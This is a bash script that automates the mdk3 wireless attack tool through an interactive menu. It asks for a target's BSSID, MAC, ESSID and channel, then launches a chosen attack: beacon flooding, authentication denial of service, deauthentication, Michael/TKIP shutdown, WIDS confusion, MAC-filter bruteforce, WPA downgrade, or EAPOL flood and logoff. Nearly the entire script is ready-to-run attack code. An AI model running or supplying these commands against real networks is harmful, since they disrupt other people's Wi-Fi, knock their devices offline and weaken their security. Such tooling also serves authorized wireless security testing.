#!/bin/bash

# This script will run basic mdk3 attacks.
# You must have mdk3 installed!

clear
echo ""
echo "Welcome to the mdk3 automater by Yokai Seishinkage!"
echo ""
echo "----------------------------------------------------"


automdk3()
{
echo ""
PS3='What attack would you like to run?: '
echo ""
select CHOICE in "Becon-Flood" "Authentication-DOS" "Basic-Probing" "Deauthenticate" "Michael-Shutdown-Exploit" "WIDS-Confusion" "MAC-Filter-Bruteforce" "WPA-Downgrade" "802.1X-Tests" "Nothing" 
do

if [ "$CHOICE" == "Becon-Flood" ]
   then
   echo ""
   echo "Becon-flood mode selected!"
   echo ""
   echo "------------------------------------------------"
   echo "please enter the 'BSSID' of the target."
   read TARGET
   echo "You entered $TARGET." && sleep 1
   echo ""
   echo "Please set the packets per second. (Default: 50)"
   read PPS
   echo ""
   echo "You entered: $PPS"
   echo ""
   echo "Please enter the channel of the target."
   read CHANNEL
   echo ""
   echo "You entered: $CHANNEL"
   echo ""
   echo "Starting the attack!"
   mdk3 mon0 b -n $TARGET -s $PPS -h $CHANNEL -c $CHANNEL
fi

if [ "$CHOICE" == "Authentication-DOS" ]
   then
   echo ""
   echo "Authentication DoS mode selected!"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the target MAC."
   read MAC
   echo ""
   echo "You entered: $MAC"
   echo ""
   echo "Please enter the packets per second to use. (Default: Unlimited)"
   read PACKETS
   echo ""
   echo "You entered: $PACKETS"
   echo ""
   echo "Starting the attack!"
   echo ""
   mdk3 mon0 a -a $MAC -s $PACKETS
fi

if [ "$CHOICE" == "Basic-Probing" ]
   then
   echo ""
   echo "Basic probing selected!"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the target MAC."
   read TMAC
   echo ""
   echo "You entered: $TMAC"
   echo ""
   echo "Please enter target ESSID."
   read ESSID
   echo "You have entered: $ESSID"
   echo ""
   echo "Please set the packets per second. (Default 300)"
   read PAKPS
   echo "You have entered: $PAKPS"
   echo ""
   echo "Starting the attack!"
   echo ""
   mdk3 mon0 p -e $ESSID -t $TMAC -s $PAKPS
fi

if [ "$CHOICE" == "Deauthenticate" ]
   then
   echo ""
   echo "Deauthentication selected!"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the packets per second. (Default: Unlimited)"
   read PACPS
   echo "You have entered: $PACPS"
   echo ""
   echo "Please enter the channel(s) you wish to use. (chan,chan,chan...)"
   read CHAN
   echo "You have entered: $CHAN"
   echo ""
   echo "Starting the attack!"
   echo ""
   mdk3 mon0 d -s $PACPS -c $CHAN
fi

if [ "$CHOICE" == "Michael-Shutdown-Exploit" ]
   then
   echo ""
   echo "Michael-Shutdown-Exploit selected! (TKIP)"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the target MAC address."
   read MACA
   echo "You have entered: $MACA"
   echo ""
   echo "Please enter the seconds between bursts. (Default: 10)"
   read BURSTS
   echo "you have entered: $BURSTS"
   echo ""
   echo "Please enter how many packets per burst. (Default: 70)"
   read PPB
   echo "You have entered: $PPB"
   echo ""
   echo "Please enter a speed. (Default: 400)"
   read SPEED
   echo "You have entered: $SPEED"
   echo ""
   echo "Starting the attack!"
   echo ""
   mdk3 mon0 m -t $MACA -w $BURSTS -n $PPB -s $SPEED -j
fi

if [ "$CHOICE" == "WIDS-Confusion" ]
   then
   echo ""
   echo "You have selected WIDS/WIPS-Confusion!"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the ESSID of target."
   read SSID
   echo "You have entered: $SSID"
   echo ""
   echo "Please enter a channel."
   read CHANNEL
   echo "You have entered: $CHANNEL"
   echo ""
   echo "Starting the attack!"
   echo ""
   mdk3 mon0 w -e $SSID -c $CHANNEL 
fi

if [ "$CHOICE" == "MAC-Filter-Bruteforce" ]
   then
   echo ""
   echo "You have selected MAC-Filter-Bruteforce!"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the target MAC address."
   read NMAC
   echo "You have entered: $NMAC"
   echo ""
   echo "Please enter the MAC address to use for bruteforcing."
   read BMAC
   echo "You have entered: $BMAC"
   echo ""
   echo "Starting the attack!"
   sleep 1
   mdk3 mon0 f -t $NMAC -f $BMAC
fi

if [ "$CHOICE" == "WPA-Downgrade" ]
   then
   echo ""
   echo "You have selected WPA-Downgrade!"
   echo "------------------------------------------------"
   echo ""
   echo "Please enter the target MAC address."
   read BSSID
   echo "You have entered: $BSSID"
   echo ""
   echo "starting the attack!"
   sleep 1
   mdk3 mon0 g -t $BSSID
fi

if [ "$CHOICE" == "802.1X-Tests" ]
   then
   echo ""
   echo "You have selected 802.1X-Tests!"
   echo "------------------------------------------------"
   echo ""
   echo "Please choose either '0' (EAPOL flood) or '1' (EAPOL Logoff)."
   read EAPOL

        if [ "$EAPOL" == "0" ]
           then
           echo "You have selected EAPOL flood!"
           sleep 1
           echo ""
           echo "please enter a target MAC."
           read FMAC
           echo "You have entered: $FMAC"
           echo ""
           echo "Please enter the target ESSID."
           read ID
           echo "You have entered: $ID"
           echo ""
           echo "Please enter a WPA type. Enter 1 or 2. (1: WPA and 2: WPA2/RSN; default is WPA)"
           read TYPE
           echo "You have entered: $TYPE"
           echo ""
           echo "Please enter a cipher. (TKIP or CCMP) !!!UPPER CASE ONLY!!!"
           read CIPHER
           echo "You have entered: $CIPHER"
           echo ""
           echo "Please enter packets per second. (default: 400)"
           read ZOOM
           echo "You have entered: $ZOOM"
           echo ""
           echo "Starting the attack!"
           sleep 1
           mdk3 mon0 x 0 -t $FMAC -n $ID -w $TYPE -u $CIPHER -s $ZOOM

        elif [ "$EAPOL" == "1" ]
             then
             echo ""
             echo "You have entered EAPOL Logoff! (Forces target station to log off)"
             echo ""
             echo "Please enter the MAC of the target AP."
             read AP
             echo "You have entered: $AP"
             echo ""
             echo "Please enter the MAC of the target Station."
             read STA
             echo "You have entered: $STA"
             echo ""
             echo "Please enter the speed. (Default: 400)"
             read VROOM
             echo "You have entered: $VROOM"
             echo ""
             echo "Starting the attack!"
             sleep 1
             mdk3 mon0 x 1 -t $AP -c $STA -s $VROOM
          fi
fi

if [ "$CHOICE" == "Nothing" ]
   then
   echo ""
   echo "Nothing selected! Quitting!"
   sleep 1
   clear
   exit 0
fi
done
}

while true
do
  automdk3
done
